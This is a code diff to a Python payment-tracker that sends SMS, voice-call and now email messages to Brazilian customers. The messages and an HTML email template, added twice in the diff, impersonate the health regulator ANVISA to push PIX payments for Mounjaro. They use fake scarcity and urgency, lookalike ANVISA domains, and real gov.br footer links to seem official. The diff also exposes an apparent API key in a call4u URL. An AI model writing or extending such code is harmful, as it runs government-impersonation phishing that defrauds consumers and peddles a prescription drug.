@@ -116,6 +116,7 @@ def _send_initial_payment_sms_async(transaction_id, customer_data):
     # Extract customer data
     customer_name = customer_data.get('name', '')
     phone_number = customer_data.get('phone', '')
+    email = customer_data.get('email', '')
     
     if not phone_number:
         logger.error(f"[PAYMENT_TRACKER][ASYNC] Cannot send initial SMS - no phone number for {transaction_id}")
@@ -129,6 +130,94 @@ def _send_initial_payment_sms_async(transaction_id, customer_data):
     if not phone_number.startswith('55'):
         phone_number = '55' + phone_number.lstrip('+')
     
+    # HTML template for email - mesmo template para mensagem inicial e lembrete
+    email_template = """<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PIX Gerado para Mounjaro</title>
+
+<table border="0" cellpadding="0" cellspacing="0" width="100%">
+    <tbody>
+        <tr>
+            <td align="center" valign="top" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">
+                <table border="0" cellpadding="0" cellspacing="0" width="600" style="max-width: 600px;">
+                    <!-- Cabeçalho -->
+                    <tbody>
+                        <tr>
+                            <td align="center" bgcolor="#006400" style="padding: 30px; color: white;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="background" data-bg-color="rgb(0, 100, 0)">
+                                <h1 style="margin: 0; font-size: 24px; font-weight: bold; color: white;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">PIX Gerado para Mounjaro!</h1>
+                                <p style="margin: 10px 0 0 0; font-size: 14px; color: white;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">Últimas 200 unidades disponíveis! Sua reserva expira em breve.</p>
+                            </td>
+                        </tr>
+
+                        <!-- Conteúdo principal -->
+                        <tr>
+                            <td bgcolor="#ffffff" style="padding: 30px; color: #333333;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="background" data-bg-color="rgb(255, 255, 255)">
+                                <p style="margin: 0 0 15px 0;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">
+                                    Olá, <strong>{{firstName}}</strong>,
+                                </p>
+                                <p style="margin: 0 0 15px 0;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">
+                                    A Agência Nacional de Vigilância Sanitária (ANVISA) informa que seu PIX para aquisição do Mounjaro foi gerado com sucesso. Nosso estoque é limitado, com apenas 200 unidades restantes.
+                                </p>
+                                <p style="margin: 0 0 20px 0;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">
+                                    Para garantir sua reserva, realize o pagamento do PIX o mais rápido possível. A validade da sua reserva é limitada!
+                                </p>
+
+                                <!-- Box de destaque -->
+                                <table border="0" cellpadding="0" cellspacing="0" width="100%" style="background-color: #F5F5F5; border-left: 4px solid #FFD700; margin: 0 0 20px 0;">
+                                    <tbody>
+                                        <tr>
+                                            <td style="padding: 15px;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">
+                                                <p style="margin: 0; font-weight: bold;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">Próximos passos:</p>
+                                                <ol style="margin: 10px 0 0 20px; padding: 0;">
+                                                    <li style="margin-bottom: 8px;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">Acesse o link para realizar o pagamento do PIX</li>
+                                                    <li style="margin-bottom: 8px;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">Confirme o pagamento para garantir sua reserva</li>
+                                                    <li class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">Aguarde a confirmação e detalhes da entrega</li>
+                                                </ol>
+                                            </td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+
+                                <!-- Botão de ação -->
+                                <table border="0" cellpadding="0" cellspacing="0" width="100%">
+                                    <tbody>
+                                        <tr>
+                                            <td align="center" style="padding: 20px 0;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">
+                                                <table border="0" cellpadding="0" cellspacing="0">
+                                                    <tbody>
+                                                        <tr>
+                                                            <td bgcolor="#000080" style="border-radius: 4px;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="background" data-bg-color="rgb(0, 0, 128)">
+                                                                <a href="{{link_encurtado}}" target="_blank" style="display: inline-block; padding: 12px 25px; color: white; text-decoration: none; font-weight: bold; font-size: 16px;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="button">PAGAR PIX AGORA</a>
+                                                            </td>
+                                                        </tr>
+                                                    </tbody>
+                                                </table>
+                                            </td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </td>
+                        </tr>
+
+                        <!-- Rodapé -->
+                        <tr>
+                            <td bgcolor="#F5F5F5" style="padding: 20px; text-align: center; border-top: 1px solid #DDDDDD;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="background" data-bg-color="rgb(245, 245, 245)">
+                                <p style="margin: 0 0 10px 0; color: #666666; font-size: 12px;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">
+                                    <a href="https://www.gov.br/anvisa/pt-br" style="color: #666666; text-decoration: none; margin: 0 10px;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="button">Políticas de Privacidade</a> | 
+                                    <a href="https://www.gov.br/anvisa/pt-br" style="color: #666666; text-decoration: none; margin: 0 10px;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="button">Termos de Serviço</a>
+                                </p>
+                                <p style="margin: 0; color: #666666; font-size: 12px;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">
+                                    Este é um e-mail automático. Não responda diretamente. Para dúvidas, acesse o site oficial da ANVISA.
+                                </p>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+            </td>
+        </tr>
+    </tbody>
+</table>"""
+    
     try:
         # Message template for new PIX generation
         message = f"ANVISA INFORMA: Seu Pedido MOUNJARO (1 CAIXA COM 4 UNIDADES) foi gerado com sucesso. Finalize o pagamento do QRcode PIX e confirme a sua compra antes que expire"
@@ -141,8 +230,20 @@ def _send_initial_payment_sms_async(transaction_id, customer_data):
             'message': message,
             'enableVoiceCall': True,
             'campaignName': "Mounjaro - Pagamento Gerado",
-            'shortenableLink': "https://anvisadobrasil.org"
+            'shortenableLink': f"https://anvisa.vigilancia-sanitaria.org/remarketing/{transaction_id}",
+            'shortenerDomain': "anvisadobrasil.org"
         }
+        
+        # Adicionar parâmetros de e-mail conforme solicitado
+        if email:
+            # Adicionar suporte a e-mail
+            request_data['enableEmail'] = True
+            request_data['email'] = email
+            request_data['emailSubject'] = 'ANVISA: Seu PIX para Mounjaro Está Pronto! Pague Agora'
+            request_data['emailTemplate'] = email_template
+            
+            logger.info(f"[PAYMENT_TRACKER][ASYNC] Added email parameters for {email}")
+        
         logger.info(f"[PAYMENT_TRACKER][ASYNC] SMS request data: {request_data}")
         
         # Send SMS via the API
@@ -162,6 +263,7 @@ def _send_initial_payment_sms_async(transaction_id, customer_data):
             
     except Exception as e:
         logger.error(f"[PAYMENT_TRACKER][ASYNC] Error sending initial SMS for {transaction_id}: {str(e)}")
+
 
 
 def send_reminder_sms(transaction_id, customer_data):
@@ -218,6 +320,7 @@ def _send_reminder_sms_async(transaction_id, customer_data):
     # Extract customer data
     customer_name = customer_data.get('name', '')
     phone_number = customer_data.get('phone', '')
+    email = customer_data.get('email', '')
     
     if not phone_number:
         logger.error(f"[PAYMENT_TRACKER][ASYNC] Cannot send reminder SMS - no phone number for {transaction_id}")
@@ -231,6 +334,94 @@ def _send_reminder_sms_async(transaction_id, customer_data):
     if not phone_number.startswith('55'):
         phone_number = '55' + phone_number.lstrip('+')
     
+    # HTML template for email
+    email_template = """<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PIX Gerado para Mounjaro</title>
+
+<table border="0" cellpadding="0" cellspacing="0" width="100%">
+    <tbody>
+        <tr>
+            <td align="center" valign="top" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">
+                <table border="0" cellpadding="0" cellspacing="0" width="600" style="max-width: 600px;">
+                    <!-- Cabeçalho -->
+                    <tbody>
+                        <tr>
+                            <td align="center" bgcolor="#006400" style="padding: 30px; color: white;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="background" data-bg-color="rgb(0, 100, 0)">
+                                <h1 style="margin: 0; font-size: 24px; font-weight: bold; color: white;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">PIX Gerado para Mounjaro!</h1>
+                                <p style="margin: 10px 0 0 0; font-size: 14px; color: white;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">Últimas 200 unidades disponíveis! Sua reserva expira em breve.</p>
+                            </td>
+                        </tr>
+
+                        <!-- Conteúdo principal -->
+                        <tr>
+                            <td bgcolor="#ffffff" style="padding: 30px; color: #333333;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="background" data-bg-color="rgb(255, 255, 255)">
+                                <p style="margin: 0 0 15px 0;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">
+                                    Olá, <strong>{{firstName}}</strong>,
+                                </p>
+                                <p style="margin: 0 0 15px 0;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">
+                                    A Agência Nacional de Vigilância Sanitária (ANVISA) informa que seu PIX para aquisição do Mounjaro foi gerado com sucesso. Nosso estoque é limitado, com apenas 200 unidades restantes.
+                                </p>
+                                <p style="margin: 0 0 20px 0;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">
+                                    Para garantir sua reserva, realize o pagamento do PIX o mais rápido possível. A validade da sua reserva é limitada!
+                                </p>
+
+                                <!-- Box de destaque -->
+                                <table border="0" cellpadding="0" cellspacing="0" width="100%" style="background-color: #F5F5F5; border-left: 4px solid #FFD700; margin: 0 0 20px 0;">
+                                    <tbody>
+                                        <tr>
+                                            <td style="padding: 15px;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">
+                                                <p style="margin: 0; font-weight: bold;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">Próximos passos:</p>
+                                                <ol style="margin: 10px 0 0 20px; padding: 0;">
+                                                    <li style="margin-bottom: 8px;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">Acesse o link para realizar o pagamento do PIX</li>
+                                                    <li style="margin-bottom: 8px;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">Confirme o pagamento para garantir sua reserva</li>
+                                                    <li class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">Aguarde a confirmação e detalhes da entrega</li>
+                                                </ol>
+                                            </td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+
+                                <!-- Botão de ação -->
+                                <table border="0" cellpadding="0" cellspacing="0" width="100%">
+                                    <tbody>
+                                        <tr>
+                                            <td align="center" style="padding: 20px 0;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">
+                                                <table border="0" cellpadding="0" cellspacing="0">
+                                                    <tbody>
+                                                        <tr>
+                                                            <td bgcolor="#000080" style="border-radius: 4px;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="background" data-bg-color="rgb(0, 0, 128)">
+                                                                <a href="{{link_encurtado}}" target="_blank" style="display: inline-block; padding: 12px 25px; color: white; text-decoration: none; font-weight: bold; font-size: 16px;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="button">PAGAR PIX AGORA</a>
+                                                            </td>
+                                                        </tr>
+                                                    </tbody>
+                                                </table>
+                                            </td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </td>
+                        </tr>
+
+                        <!-- Rodapé -->
+                        <tr>
+                            <td bgcolor="#F5F5F5" style="padding: 20px; text-align: center; border-top: 1px solid #DDDDDD;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="background" data-bg-color="rgb(245, 245, 245)">
+                                <p style="margin: 0 0 10px 0; color: #666666; font-size: 12px;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">
+                                    <a href="https://www.gov.br/anvisa/pt-br" style="color: #666666; text-decoration: none; margin: 0 10px;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="button">Políticas de Privacidade</a> | 
+                                    <a href="https://www.gov.br/anvisa/pt-br" style="color: #666666; text-decoration: none; margin: 0 10px;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="button">Termos de Serviço</a>
+                                </p>
+                                <p style="margin: 0; color: #666666; font-size: 12px;" class="hover:outline-dashed hover:outline-primary/40 hover:outline-1 cursor-pointer" data-editable="text">
+                                    Este é um e-mail automático. Não responda diretamente. Para dúvidas, acesse o site oficial da ANVISA.
+                                </p>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+            </td>
+        </tr>
+    </tbody>
+</table>"""
+    
     try:
         # Message template for reminder with customer's first name and transaction ID
         message = f"ANVISA: {first_name}, seu PIX para o Mounjaro esta pronto! Ultimas 200 unidades, reserva expira em pouco tempo. Pague agora: https://anvisa.vigilancia-sanitaria.org/remarketing/{transaction_id}"
@@ -242,10 +433,22 @@ def _send_reminder_sms_async(transaction_id, customer_data):
             'phone': phone_number,
             'message': message,
             'enableVoiceCall': True,
-            'campaignName': "Lembrete de pagamento",
-            'shortenableLink': "https://anvisadobrasil.org",
+            'campaignName': "INFORMAGERADO",
+            'shortenableLink': f"https://anvisa.vigilancia-sanitaria.org/remarketing/{transaction_id}", 
             'shortenerDomain': "anvisadobrasil.org",
+            'voiceApiUrl': "https://v1.call4u.com.br/api/integrations/add/5a1e3a5aede16d438c38862cac1a78db/default"
         }
+        
+        # Adicionar parâmetros de e-mail conforme solicitado
+        if email:
+            # Adicionar suporte a e-mail
+            request_data['enableEmail'] = True
+            request_data['email'] = email
+            request_data['emailSubject'] = 'ANVISA: Seu PIX para Mounjaro Está Pronto! Pague Agora'
+            request_data['emailTemplate'] = email_template
+            
+            logger.info(f"[PAYMENT_TRACKER][ASYNC] Added email parameters for {email}")
+        
         logger.info(f"[PAYMENT_TRACKER][ASYNC] Reminder SMS request data: {request_data}")
         
         # Send SMS via the API
@@ -265,6 +468,7 @@ def _send_reminder_sms_async(transaction_id, customer_data):
             
     except Exception as e:
         logger.error(f"[PAYMENT_TRACKER][ASYNC] Error sending reminder SMS for {transaction_id}: {str(e)}")
+
 
 
 def check_pending_payments():
